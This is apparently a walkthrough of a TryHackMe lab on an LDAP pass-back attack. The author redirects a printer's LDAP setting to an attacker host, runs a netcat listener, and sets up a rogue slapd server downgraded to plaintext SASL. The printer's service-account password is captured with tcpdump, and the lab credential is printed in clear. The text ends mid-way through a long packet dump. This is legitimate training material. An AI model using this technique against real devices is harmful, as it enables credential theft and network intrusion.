# LDAP Pass-back
- We can attempt this attack when we have configuration settings of a device.
- In this room have a configuration for a printer (http://printer.za.tryhackme.com/settings.aspx)
![screenshot for printer configuration webpage](https://github.com/divu050704/assets-holder/raw/main/tryhackme-screenshots/Screenshot_2022-11-09_10-30-06.png)

- Changed server to attacking machine IP.
- Started netcat server on port 389.

```console
❯ nc -lvp 389
listening on [any] 389 ...
```
- Sent command to test settings and got a response on netcat.

```console
❯ nc -lvp 389
listening on [any] 389 ...
10.200.24.201: inverse host lookup failed: Unknown host
connect to [10.50.22.10] from (UNKNOWN) [10.200.24.201] 53952
0�Dc�;

x�
  objectclass0�supportedCapabilities0�P0�Fc�=

```

- Here supported capabilities is telling that the printer is verifying the credentials with LDAP before sending it to us.
- So started a rogue LDAP server 

# Creating a rogue LDAP server
- LDAP was not installed on my system so installed it.

```console
❯ sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
Get:1 http://kali.download/kali kali-rolling InRelease [30.6 kB]
Get:2 http://kali.download/kali kali-rolling/main amd64 Packages [18.8 MB]
Get:3 http://kali.download/kali kali-rolling/main amd64 Contents (deb) [43.0 MB]
Get:4 http://kali.download/kali kali-rolling/contrib amd64 Packages [111 kB]
Get:5 http://kali.download/kali kali-rolling/contrib amd64 Contents (deb) [163 kB]
Get:6 http://kali.download/kali kali-rolling/non-free amd64 Packages [235 kB]
Get:7 http://kali.download/kali kali-rolling/non-free amd64 Contents (deb) [897 kB]
Fetched 63.2 MB in 19s (3,405 kB/s)
Reading package lists... Done
```

- Configured LDAP 

```console
❯ sudo dpkg-reconfigure -p low slapd
```

![screenshot for LDAP configuration](https://github.com/divu050704/assets-holder/raw/main/tryhackme-screenshots/97afd26fd4f6d10a2a86ab65ac401845.png) <br />
![screenshot for LDAP configuration](https://github.com/divu050704/assets-holder/raw/main/tryhackme-screenshots/01b0d4256900cbf48d8d082d8bdf14bb.png) <br />
![screenshot for LDAP configuration](https://github.com/divu050704/assets-holder/raw/main/tryhackme-screenshots/c4bef0c3f054c32ca982ee9c1608ba1b.png) <br />
![screenshot for LDAP configuration](https://github.com/divu050704/assets-holder/raw/main/tryhackme-screenshots/23b957d41ddba8060e4bc2295b56a2fb.png) <br />
![screenshot for LDAP configuration](https://github.com/divu050704/assets-holder/raw/main/tryhackme-screenshots/07af572567aa32e0e0be2b4d9f54b89a.png) <br />
![screenshot for LDAP configuration](https://github.com/divu050704/assets-holder/raw/main/tryhackme-screenshots/4d5086da7b25a6f218d6eebdab6d3b71.png) <br />
![screenshot for LDAP configuration](https://github.com/divu050704/assets-holder/raw/main/tryhackme-screenshots/d383582606e776eb901650ac9799cef5.png) <br />

- Made this rogue LDAP server vulnerable by making a vulnerable config file

```console
❯ cat >> olcSaslSecProps.ldif << "EOF"
heredoc> #olcSaslSecProps.ldif
heredoc> dn: cn=config
heredoc> replace: olcSaslSecProps
heredoc> olcSaslSecProps: noanonymous,minssf=0,passcred
heredoc> EOF
❯ cat olcSaslSecProps.ldif
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred

```

> olcSaslSecProps: Specifies the SASL security properties
> noanonymous: Disables mechanisms that support anonymous login
> minssf: Specifies the minimum acceptable security strength with 0, meaning no protection.

- Started the  rogue LDAP server.

```console
❯ sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
[sudo] password for divu050704:
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
modifying entry "cn=config"
```

- Verified that our configuration file is being used.

```console
❯ ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
dn:
supportedSASLMechanisms: LOGIN
supportedSASLMechanisms: PLAIN
```

# Capturing LDAP Credentials
- Started tcpdump  on our attacking machine to capture the password.

```console

❯ sudo tcpdump -SX -i breachad tcp port 389
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on breachad, link-type RAW (Raw IP), snapshot length 262144 bytes
```
 
- Again went to (http://printer.za.tryhackme.com/settings) and changed server IP to ours and tested settings 
- Got password in second attempt `tryhackme.com\svcLDAP..tryhackmeldappass1@ `

```console
❯ sudo tcpdump -SX -i breachad tcp port 389  | tee tcpdump.log
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on breachad, link-type RAW (Raw IP), snapshot length 262144 bytes
11:06:47.442926 IP 10.200.24.201.49569 > 10.50.22.10.ldap: Flags [SEW], seq 1287106193, win 64240, options [mss 1286,nop,wscale 8,nop,nop,sackOK], length 0
	0x0000:  4502 0034 d50f 4000 7f06 e2e5 0ac8 18c9  E..4..@.........
	0x0010:  0a32 160a c1a1 0185 4cb7 ae91 0000 0000  .2......L.......
	0x0020:  80c2 faf0 71d1 0000 0204 0506 0103 0308  ....q...........
	0x0030:  0101 0402                                ....
11:06:47.442976 IP 10.50.22.10.ldap > 10.200.24.201.49569: Flags [S.], seq 881272171, ack 1287106194, win 64240, options [mss 1460,nop,nop,sackOK,nop,wscale 7], length 0
	0x0000:  4500 0034 0000 4000 4006 f6f7 0a32 160a  E..4..@.@....2..
	0x0010:  0ac8 18c9 0185 c1a1 3487 256b 4cb7 ae92  ........4.%kL...
	0x0020:  8012 faf0 17e1 0000 0204 05b4 0101 0402  ................
	0x0030:  0103 0307                                ....
11:06:47.601242 IP 10.200.24.201.49569 > 10.50.22.10.ldap: Flags [.], ack 881272172, win 1024, length 0
	0x0000:  4500 0028 d510 4000 7f06 e2f2 0ac8 18c9  E..(..@.........
	0x0010:  0a32 160a c1a1 0185 4cb7 ae92 3487 256c  .2......L...4.%l
	0x0020:  5010 0400 4fa4 0000                      P...O...
11:06:47.601304 IP 10.200.24.201.49569 > 10.50.22.10.ldap: Flags [P.], seq 1287106194:1287106268, ack 881272172, win 1024, length 74
	0x0000:  4500 0072 d511 4000 7f06 e2a7 0ac8 18c9  E..r..@.........
	0x0010:  0a32 160a c1a1 0185 4cb7 ae92 3487 256c  .2......L...4.%l
	0x0020:  5018 0400 dc16 0000 3084 0000 0044 0201  P.......0....D..
	0x0030:  3363 8400 0000 3b04 000a 0100 0a01 0002  3c....;.........
	0x0040:  0100 0201 7801 0100 870b 6f62 6a65 6374  ....x.....object
	0x0050:  636c 6173 7330 8400 0000 1704 1573 7570  class0.......sup
	0x0060:  706f 7274 6564 4361 7061 6269 6c69 7469  portedCapabiliti
	0x0070:  6573                                     es
11:06:47.601320 IP 10.50.22.10.ldap > 10.200.24.201.49569: Flags [.], ack 1287106268, win 502, length 0
	0x0000:  4500 0028 dd08 4000 4006 19fb 0a32 160a  E..(..@.@....2..
	0x0010:  0ac8 18c9 0185 c1a1 3487 256c 4cb7 aedc  ........4.%lL...
	0x0020:  5010 01f6 5164 0000                      P...Qd..
11:06:47.601862 IP 10.50.22.10.ldap > 10.200.24.201.49569: Flags [P.], seq 881272172:881272183, ack 1287106268, win 502, length 11
	0x0000:  4500 0033 dd09 4000 4006 19ef 0a32 160a  E..3..@.@....2..
	0x0010:  0ac8 18c9 0185 c1a1 3487 256c 4cb7 aedc  ........4.%lL...
	0x0020:  5018 01f6 e7ae 0000 3009 0201 3364 0404  P.......0...3d..
	0x0030:  0030 00                                  .0.
11:06:47.601882 IP 10.50.22.10.ldap > 10.200.24.201.49569: Flags [P.], seq 881272183:881272197, ack 1287106268, win 502, length 14
	0x0000:  4500 0036 dd0a 4000 4006 19eb 0a32 160a  E..6..@.@....2..
	0x0010:  0ac8 18c9 0185 c1a1 3487 2577 4cb7 aedc  ........4.%wL...
	0x0020:  5018 01f6 dbc6 0000 300c 0201 3365 070a  P.......0...3e..
	0x0030:  0100 0400 0400                           ......
11:06:47.760141 IP 10.200.24.201.49569 > 10.50.22.10.ldap: Flags [.], ack 881272197, win 1024, length 0
	0x0000:  4500 0028 d512 4000 7f06 e2f0 0ac8 18c9  E..(..@.........
	0x0010:  0a32 160a c1a1 0185 4cb7 aedc 3487 2585  .2......L...4.%.
	0x0020:  5010 0400 4f41 0000                      P...OA..
11:06:47.760163 IP 10.200.24.201.49569 > 10.50.22.10.ldap: Flags [P.], seq 1287106268:1287106344, ack 881272197, win 1024, length 76
	0x0000:  4500 0074 d513 4000 7f06 e2a3 0ac8 18c9  E..t..@.........
	0x0010:  0a32 160a c1a1 0185 4cb7 aedc 3487 2585  .2......L...4.%.
	0x0020:  5018 0400 a171 0000 3084 0000 0046 0201  P....q..0....F..
	0x0030:  3463 8400 0000 3d04 000a 0100 0a01 0002  4c....=.........
	0x0040:  0100 0201 7801 0100 870b 6f62 6a65 6374  ....x.....object
	0x0050:  636c 6173 7330 8400 0000 1904 1773 7570  class0.......sup
	0x0060:  706f 7274 6564 5341 534c 4d65 6368 616e  portedSASLMechan
	0x0070:  6973 6d73                                isms
11:06:47.760173 IP 10.50.22.10.ldap > 10.200.24.201.49569: Flags [.], ack 1287106344, win 502, length 0
	0x0000:  4500 0028 dd0b 4000 4006 19f8 0a32 160a  E..(..@.@....2..
	0x0010:  0ac8 18c9 0185 c1a1 3487 2585 4cb7 af28  ........4.%.L..(
	0x0020:  5010 01f6 50ff 0000                      P...P...
11:06:47.760433 IP 10.50.22.10.ldap > 10.200.24.201.49569: Flags [P.], seq 881272197:881272251, ack 1287106344, win 502, length 54
	0x0000:  4500 005e dd0c 4000 4006 19c1 0a32 160a  E..^..@.@....2..
	0x0010:  0ac8 18c9 0185 c1a1 3487 2585 4cb7 af28  ........4.%.L..(
	0x0020:  5018 01f6 5053 0000 3034 0201 3464 2f04  P...PS..04..4d/.
	0x0030:  0030 2b30 2904 1773 7570 706f 7274 6564  .0+0)..supported
	0x0040:  5341 534c 4d65 6368 616e 6973 6d73 310e  SASLMechanisms1.
	0x0050:  0405 4c4f 4749 4e04 0550 4c41 494e       ..LOGIN..PLAIN
11:06:47.760455 IP 10.50.22.10.ldap > 10.200.24.201.49569: Flags [P.], seq 881272251:881272265, ack 1287106344, win 502, length 14
	0x0000:  4500 0036 dd0d 4000 4006 19e8 0a32 160a  E..6..@.@....2..
	0x0010:  0ac8 18c9 0185 c1a1 3487 25bb 4cb7 af28  ........4.%.L..(
	0x0020:  5018 01f6 da36 0000 300c 0201 3465 070a  P....6..0...4e..
	0x0030:  0100 0400 0400                           ......
11:06:47.918747 IP 10.200.24.201.49569 > 10.50.22.10.ldap: Flags [.], ack 881272265, win 1024, length 0
	0x0000:  4500 0028 d514 4000 7f06 e2ee 0ac8 18c9  E..(..@.........
	0x0010:  0a32 160a c1a1 0185 4cb7 af28 3487 25c9  .2......L..(4.%.
	0x0020:  5010 0400 4eb1 0000                      P...N...
11:06:47.919442 IP 10.200.24.201.49569 > 10.50.22.10.ldap: Flags [P.], seq 1287106344:1287106418, ack 881272265, win 1024, length 74
	0x0000:  4500 0072 d515 4000 7f06 e2a3 0ac8 18c9  E..r..@.........
	0x0010:  0a32 160a c1a1 0185 4cb7 af28 3487 25c9  .2......L..(4.%.
	0x0020:  5018 0400 d923 0000 3084 0000 0044 0201  P....#..0....D..
	0x0030:  3563 8400 0000 3b04 000a 0100 0a01 0002  5c....;.........
	0x0040:  0100 0201 7801 0100 870b 6f62 6a65 6374  ....x.....object
	0x0050:  636c 6173 7330 8400 0000 1704 1573 7570  class0.......sup
	0x0060:  706f 7274 6564 4361 7061 6269 6c69 7469  portedCapabiliti
	0x0070:  6573                                     es
11:06:47.919453 IP 10.50.22.10.ldap > 10.200.24.201.49569: Flags [.], ack 1287106418, win 502, length 0
	0x0000:  4500 0028 dd0e 4000 4006 19f5 0a32 160a  E..(..@.@....2..
	0x0010:  0ac8 18c9 0185 c1a1 3487 25c9 4cb7 af72  ........4.%.L..r
	0x0020:  5010 01f6 5071 0000                      P...Pq..
11:06:47.919628 IP 10.50.22.10.ldap > 10.200.24.201.49569: Flags [P.], seq 881272265:881272276, ack 1287106418, win 502, length 11
	0x0000:  4500 0033 dd0f 4000 4006 19e9 0a32 160a  E..3..@.@....2..
	0x0010:  0ac8 18c9 0185 c1a1 3487 25c9 4cb7 af72  ........4.%.L..r
	0x0020:  5018 01f6 e4bb 0000 3009 0201 3564 0404  P.......0...5d..
	0x0030:  0030 00                                  .0.
11:06:47.919700 IP 10.50.22.10.ldap > 10.200.24.201.49569: Flags [P.], seq 881272276:881272290, ack 1287106418, win 502, length 14
	0x0000:  4500 0036 dd10 4000 4006 19e5 0a32 160a  E..6..@.@....2..
	0x0010:  0ac8 18c9 0185 c1a1 3487 25d4 4cb7 af72  ........4.%.L..r
	0x0020:  5018 01f6 d8d3 0000 300c 0201 3565 070a  P.......0...5e..
	0x0030:  0100 0400 0400                           ......
11:06:48.078378 IP 10.200.24.201.49569 > 10.50.22.10.ldap: Flags [.], ack 881272290, win 1024, length 0
	0x0000:  4500 0028 d516 4000 7f06 e2ec 0ac8 18c9  E..(..@.........
	0x0010:  0a32 160a c1a1 0185 4cb7 af72 3487 25e2  .2......L..r4.%.
	0x0020:  5010 0400 4e4e 0000                      P...NN..
11:06:48.078829 IP 10.200.24.201.49569 > 10.50.22.10.ldap: Flags [P.], seq 1287106418:1287106484, ack 881272290, win 1024, length 66
	0x0000:  4500 006a d517 4000 7f06 e2a9 0ac8 18c9  E..j..@.........
	0x0010:  0a32 160a c1a1 0185 4cb7 af72 3487 25e2  .2......L..r4.%.
	0x0020:  5018 0400 47a1 0000 3084 0000 003c 0201  P...G...0....<..
	0x0030:  3660 8400 0000 3302 0103 0404 4e54 4c4d  6`....3.....NTLM
	0x0040:  8a28 4e54 4c4d 5353 5000 0100 0000 0782  .(NTLMSSP.......
	0x0050:  08a2 0000 0000 0000 0000 0000 0000 0000  ................
	0x0060:  0000 0a00 6345 0000 000f                 ....cE....
11:06:48.078842 IP 10.50.22.10.ldap > 10.200.24.201.49569: Flags [.], ack 1287106484, win 502, length 0
	0x0000:  4500 0028 dd11 4000 4006 19f2 0a32 160a  E..(..@.@....2..
	0x0010:  0ac8 18c9 0185 c1a1 3487 25e2 4cb7 afb4  ........4.%.L...
	0x0020:  5010 01f6 5016 0000                      P...P...
11:06:48.079011 IP 10.50.22.10.ldap > 10.200.24.201.49569: Flags [P.], seq 881272290:881272314, ack 1287106484, win 502, length 24
	0x0000:  4500 0040 dd12 4000 4006 19d9 0a32 160a  E..@..@.@....2..
	0x0010:  0ac8 18c9 0185 c1a1 3487 25e2 4cb7 afb4  ........4.%.L...
	0x0020:  5018 01f6 d89f 0000 3016 0201 3661 110a  P.......0...6a..
	0x0030:  0122 0400 040a 696e 7661 6c69 6420 444e  ."....invalid.DN
11:06:48.238150 IP 10.200.24.201.49570 > 10.50.22.10.ldap: Flags [SEW], seq 1458803064, win 64240, options [mss 1286,nop,wscale 8,nop,nop,sackOK], length 0
	0x0000:  4502 0034 d518 4000 7f06 e2dc 0ac8 18c9  E..4..@.........
	0x0010:  0a32 160a c1a2 0185 56f3 9178 0000 0000  .2......V..x....
	0x0020:  80c2 faf0 84ad 0000 0204 0506 0103 0308  ................
	0x0030:  0101 0402                                ....
11:06:48.238179 IP 10.50.22.10.ldap > 10.200.24.201.49570: Flags [S.], seq 3963582641, ack 1458803065, win 64240, options [mss 1460,nop,nop,sackOK,nop,wscale 7], length 0
	0x0000:  4500 0034 0000 4000 4006 f6f7 0a32 160a  E..4..@.@....2..
	0x0010:  0ac8 18c9 0185 c1a2 ec3f 78b1 56f3 9179  .........?x.V..y
	0x0020:  8012 faf0 1fbe 0000 0204 05b4 0101 0402  ................
	0x0030:  0103 0307                                ....
11:06:48.292052 IP 10.200.24.201.49569 > 10.50.22.10.ldap: Flags [.], ack 881272314, win 1024, length 0
	0x0000:  4500 0028 d519 4000 7f06 e2e9 0ac8 18c9  E..(..@.........
	0x0010:  0a32 160a c1a1 0185 4cb7 afb4 3487 25fa  .2......L...4.%.
	0x0020:  5010 0400 4df4 0000                      P...M...
11:06:48.397522 IP 10.200.24.201.49570 > 10.50.22.10.ldap: Flags [.], ack 3963582642, win 1024, length 0
	0x0000:  4500 0028 d51a 4000 7f06 e2e8 0ac8 18c9  E..(..@.........
	0x0010:  0a32 160a c1a2 0185 56f3 9179 ec3f 78b2  .2......V..y.?x.
	0x0020:  5010 0400 5781 0000                      P...W...
11:06:48.397576 IP 10.200.24.201.49570 > 10.50.22.10.ldap: Flags [P.], seq 1458803065:1458803130, ack 3963582642, win 1024, length 65
	0x0000:  4500 0069 d51b 4000 7f06 e2a6 0ac8 18c9  E..i..@.........
	0x0010:  0a32 160a c1a2 0185 56f3 9179 ec3f 78b2  .2......V..y.?x.
	0x0020:  5018 0400 559b 0000 3084 0000 003b 0201  P...U...0....;..
	0x0030:  3760 8400 0000 3202 0102 0418 7a61 2e74  7`....2.....za.t
	0x0040:  7279 6861 636b 6d65 2e63 6f6d 5c73 7663  ryhackme.com\svc
	0x0050:  4c44 4150 8013 7472 7968 6163 6b6d 656c  LDAP..tryhackmel
	0x0060:  6461 7070 6173 7331 40                   dappass1@
11:06:48.397589 IP 10.50.22.10.ldap > 10.200.24.201.49570: Flags [.], ack 1458803130, win 502, length 0
	0x0000:  4500 0028 dfa3 4000 4006 1760 0a32 160a  E..(..@.@..`.2..
	0x0010:  0ac8 18c9 0185 c1a2 ec3f 78b2 56f3 91ba  .........?x.V...
	0x0020:  5010 01f6 594a 0000                      P...YJ..
11:06:48.397898 IP 10.50.22.10.ldap > 10.200.24.201.49570: Flags [P.], seq 3963582642:3963582666, ack 1458803130, win 502, length 24
	0x0000:  4500 0040 dfa4 4000 4006 1747 0a32 160a  E..@..@.@..G.2..
	0x0010:  0ac8 18c9 0185 c1a2 ec3f 78b2 56f3 91ba  .........?x.V...
	0x0020:  5018 01f6 e0d3 0000 3016 0201 3761 110a  P.......0...7a..
	0x0030:  0122 0400 040a 696e 7661 6c69 6420 444e  ."....invalid.DN
11:06:48.606718 IP 10.200.24.201.49570 > 10.50.22.10.ldap: Flags [.], ack 3963582666, win 1024, length 0
	0x0000:  4500 0028 d51e 4000 7f06 e2e4 0ac8 18c9  E..(..@.........
	0x0010:  0a32 160a c1a2 0185 56f3 91ba ec3f 78ca  .2......V....?x.
	0x0020:  5010 0400 5728 0000                      P...W(..
11:07:10.365185 IP 10.200.24.201.49572 > 10.50.22.10.ldap: Flags [SEW], seq 3497005119, win 64240, options [mss 1286,nop,wscale 8,nop,nop,sackOK], length 0
	0x0000:  4502 0034 d522 4000 7f06 e2d2 0ac8 18c9  E..4."@.........
	0x0010:  0a32 160a c1a4 0185 d070 103f 0000 0000  .2.......p.?....
	0x0020:  80c2 faf0 8c67 0000 0204 0506 0103 0308  .....g..........
	0x0030:  0101 0402                                ....
11:07:10.365212 IP 10.50.22.10.ldap > 10.200.24.201.49572: Flags [S.], seq 315578964, ack 3497005120, win 64240, options [mss 1460,nop,nop,sackOK,nop,wscale 7], length 0
	0x0000:  4500 0034 0000 4000 4006 f6f7 0a32 160a  E..4..@.@....2..
	0x0010:  0ac8 18c9 0185 c1a4 12cf 5a54 d070 1040  ..........ZT.p.@
	0x0020:  8012 faf0 1f46 0000 0204 05b4 0101 0402  .....F..........
	0x0030:  0103 0307                                ....
11:07:10.523869 IP 10.200.24.201.49572 > 10.50.22.10.ldap: Flags [.], ack 315578965, win 1024, length 0
	0x0000:  4500 0028 d523 4000 7f06 e2df 0ac8 18c9  E..(.#@.........
	0x0010:  0a32 160a c1a4 0185 d070 1040 12cf 5a55  .2.......p.@..ZU
	0x0020:  5010 0400 5709 0000                      P...W...
11:07:10.523985 IP 10.200.24.201.49572 > 10.50.22.10.ldap: Flags [P.], seq 3497005120:3497005194, ack 315578965, win 1024, length 74
	0x0000:  4500 0072 d524 4000 7f06 e294 0ac8 18c9  E..r.$@.........
	0x0010:  0a32 160a c1a4 0185 d070 1040 12cf 5a55  .2.......p.@..ZU
	0x0020:  5018 0400 de7b 0000 3084 0000 0044 0201  P....{..0....D..
	0x0030:  3863 8400 0000 3b04 000a 0100 0a01 0002  8c....;.........
	0x0040:  0100 0201 7801 0100 870b 6f62 6a65 6374  ....x.....object
	0x0050:  636c 6173 7330 8400 0000 1704 1573 7570  class0.......sup
	0x0060:  706f 7274 6564 4361 7061 6269 6c69 7469  portedCapabiliti
	0x0070:  6573                                     es
11:07:10.524000 IP 10.50.22.10.ldap > 10.200.24.201.49572: Flags [.], ack 3497005194, win 502, length 0
	0x0000:  4500 0028 4888 4000 4006 ae7b 0a32 160a  E..(H.@.@..{.2..
	0x0010:  0ac8 18c9 0185 c1a4 12cf 5a55 d070 108a  ..........ZU.p..
	0x0020:  5010 01f6 58c9 0000                      P...X...
11:07:10.524459 IP 10.50.22.10.ldap > 10.200.24.201.49572: Flags [P.], seq 315578965:315578976, ack 3497005194, win 502, length 11
	0x0000:  4500 0033 4889 4000 4006 ae6f 0a32 160a  E..3H.@.@..o.2..
	0x0010:  0ac8 18c9 0185 c1a4 12cf 5a55 d070 108a  ..........ZU.p..
	0x0020:  5018 01f6 ea13 0000 3009 0201 3864 0404  P.......0...8d..
	0x0030:  0030 00                                  .0.
11:07:10.524477 IP 10.50.22.10.ldap > 10.200.24.201.49572: Flags [P.], seq 315578976:315578990, ack 3497005194, win 502, length 14
	0x0000:  4500 0036 488a 4000 4006 ae6b 0a32 160a  E..6H.@.@..k.2..
	0x0010:  0ac8 18c9 0185 c1a4 12cf 5a60 d070 108a  ..........Z`.p..
	0x0020:  5018 01f6 de2b 0000 300c 0201 3865 070a  P....+..0...8e..
	0x0030:  0100 0400 0400                           ......
11:07:10.683198 IP 10.200.24.201.49572 > 10.50.22.10.ldap: Flags [.], ack 315578990, win 1024, length 0
	0x0000:  4500 0028 d525 4000 7f06 e2dd 0ac8 18c9  E..(.%@.........
	0x0010:  0a32 160a c1a4 0185 d070 108a 12cf 5a6e  .2.......p....Zn
	0x0020:  5010 0400 56a6 0000                      P...V...
11:07:10.683231 IP 10.200.24.201.49572 > 10.50.22.10.ldap: Flags [P.], seq 3497005194:3497005270, ack 315578990, win 1024, length 76
	0x0000:  4500 0074 d526 4000 7f06 e290 0ac8 18c9  E..t.&@.........
	0x0010:  0a32 160a c1a4 0185 d070 108a 12cf 5a6e  .2.......p....Zn
	0x0020:  5018 0400 a3d6 0000 3084 0000 0046 0201  P.......0....F..
	0x0030:  3963 8400 0000 3d04 000a 0100 0a01 0002  9c....=.........
	0x0040:  0100 0201 7801 0100 870b 6f62 6a65 6374  ....x.....object
	0x0050:  636c 6173 7330 8400 0000 1904 1773 7570  class0.......sup
	0x0060:  706f 7274 6564 5341 534c 4d65 6368 616e  portedSASLMechan
	0x0070:  6973 6d73                                isms
11:07:10.683246 IP 10.50.22.10.ldap > 10.200.24.201.49572: Flags [.], ack 3497005270, win 502, length 0
	0x0000:  4500 0028 488b 4000 4006 ae78 0a32 160a  E..(H.@.@..x.2..
	0x0010:  0ac8 18c9 0185 c1a4 12cf 5a6e d070 10d6  ..........Zn.p..
	0x0020:  5010 01f6 5864 0000                      P...Xd..
11:07:10.683589 IP 10.50.22.10.ldap > 10.200.24.201.49572: Flags [P.], seq 315578990:315579044, ack 3497005270, win 502, length 54
	0x0000:  4500 005e 488c 4000 4006 ae41 0a32 160a  E..^H.@.@..A.2..
	0x0010:  0ac8 18c9 0185 c1a4 12cf 5a6e d070 10d6  ..........Zn.p..
	0x0020:  5018 01f6 52b8 0000 3034 0201 3964 2f04  P...R...04..9d/.
	0x0030:  0030 2b30 2904 1773 7570 706f 7274 6564  .0+0)..supported
	0x0040:  5341 534c 4d65 6368 616e 6973 6d73 310e  SASLMechanisms1.
	0x0050:  0405 4c4f 4749 4e04 0550 4c41 494e       ..LOGIN..PLAIN
11:07:10.683625 IP 10.50.22.10.ldap > 10.200.24.201.49572: Flags [P.], seq 315579044:315579058, ack 3497005270, win 502, length 14
	0x0000:  4500 0036 488d 4000 4006 ae68 0a32 160a  E..6H.@.@..h.2..
	0x0010:  0ac8 18c9 0185 c1a4 12cf 5aa4 d070 10d6  ..........Z..p..
	0x0020:  5018 01f6 dc9b 0000 300c 0201 3965 070a  P.......0...9e..
	0x0030:  0100 0400 0400                           ......
11:07:10.842459 IP 10.200.24.201.49572 > 10.50.22.10.ldap: Flags [.], ack 315579058, win 1024, length 0
	0x0000:  4500 0028 d527 4000 7f06 e2db 0ac8 18c9  E..(.'@.........
	0x0010:  0a32 160a c1a4 0185 d070 10d6 12cf 5ab2  .2.......p....Z.
	0x0020:  5010 0400 5616 0000                      P...V...
11:07:10.843190 IP 10.200.24.201.49572 > 10.50.22.10.ldap: Flags [P.], seq 3497005270:3497005344, ack 315579058, win 1024, length 74
	0x0000:  4500 0072 d528 4000 7f06 e290 0ac8 18c9  E..r.(@.........
	0x0010:  0a32 160a c1a4 0185 d070 10d6 12cf 5ab2  .2.......p....Z.
	0x0020:  5018 0400 db88 0000 3084 0000 0044 0201  P.......0....D..
	0x0030:  3a63 8400 0000 3b04 000a 0100 0a01 0002  :c....;.........
	0x0040:  0100 0201 7801 0100 870b 6f62 6a65 6374  ....x.....object
	0x0050:  636c 6173 7330 8400 0000 1704 1573 7570  class0.......sup
	0x0060:  706f 7274 6564 4361 7061 6269 6c69 7469  portedCapabiliti
	0x0070:  6573                                     es
11:07:10.843231 IP 10.50.22.10.ldap > 10.200.24.201.49572: Flags [.], ack 3497005344, win 502, length 0
	0x0000:  4500 0028 488e 4000 4006 ae75 0a32 160a  E..(H.@.@..u.2..
	0x0010:  0ac8 18c9 0185 c1a4 12cf 5ab2 d070 1120  ..........Z..p..
	0x0020:  5010 01f6 57d6 0000                      P...W...
11:07:10.843660 IP 10.50.22.10.ldap > 10.200.24.201.49572: Flags [P.], seq 315579058:315579069, ack 3497005344, win 502, length 11
	0x0000:  4500 0033 488f 4000 4006 ae69 0a32 160a  E..3H.@.@..i.2..
	0x0010:  0ac8 18c9 0185 c1a4 12cf 5ab2 d070 1120  ..........Z..p..
	0x0020:  5018 01f6 e720 0000 3009 0201 3a64 0404  P.......0...:d..
	0x0030:  0030 00                                  .0.
11:07:10.843682 IP 10.50.22.10.ldap > 10.200.24.201.49572: Flags [P.], seq 315579069:315579083, ack 3497005344, win 502, length 14
	0x0000:  4500 0036 4890 4000 4006 ae65 0a32 160a  E..6H.@.@..e.2..
	0x0010:  0ac8 18c9 0185 c1a4 12cf 5abd d070 1120  ..........Z..p..
	0x0020:  5018 01f6 db38 0000 300c 0201 3a65 070a  P....8..0...:e..
	0x0030:  0100 0400 0400                           ......
11:07:11.002739 IP 10.200.24.201.49572 > 10.50.22.10.ldap: Flags [.], ack 315579083, win 1024, length 0
	0x0000:  4500 0028 d529 4000 7f06 e2d9 0ac8 18c9  E..(.)@.........
	0x0010:  0a32 160a c1a4 0185 d070 1120 12cf 5acb  .2.......p....Z.
	0x0020:  5010 0400 55b3 0000                      P...U...
11:07:11.002762 IP 10.200.24.201.49572 > 10.50.22.10.ldap: Flags [P.], seq 3497005344:3497005410, ack 315579083, win 1024, length 66
	0x0000:  4500 006a d52a 4000 7f06 e296 0ac8 18c9  E..j.*@.........
	0x0010:  0a32 160a c1a4 0185 d070 1120 12cf 5acb  .2.......p....Z.
	0x0020:  5018 0400 4a06 0000 3084 0000 003c 0201  P...J...0....<..
	0x0030:  3b60 8400 0000 3302 0103 0404 4e54 4c4d  ;`....3.....NTLM
	0x0040:  8a28 4e54 4c4d 5353 5000 0100 0000 0782  .(NTLMSSP.......
	0x0050:  08a2 0000 0000 0000 0000 0000 0000 0000  ................
	0x0060:  0000 0a00 6345 0000 000f                 ....cE....
11:07:11.002773 IP 10.50.22.10.ldap > 10.200.24.201.49572: Flags [.], ack 3497005410, win 502, length 0
	0x0000:  4500 0028 4891 4000 4006 ae72 0a32 160a  E..(H.@.@..r.2..
	0x0010:  0ac8 18c9 0185 c1a4 12cf 5acb d070 1162  ..........Z..p.b
	0x0020:  5010 01f6 577b 0000                      P...W{..
11:07:11.002994 IP 10.50.22.10.ldap > 10.200.24.201.49572: Flags [P.], seq 315579083:315579107, ack 3497005410, win 502, length 24
	0x0000:  4500 0040 4892 4000 4006 ae59 0a32 160a  E..@H.@.@..Y.2..
	0x0010:  0ac8 18c9 0185 c1a4 12cf 5acb d070 1162  ..........Z..p.b
	0x0020:  5018 01f6 db04 0000 3016 0201 3b61 110a  P.......0...;a..
	0x0030:  012


```

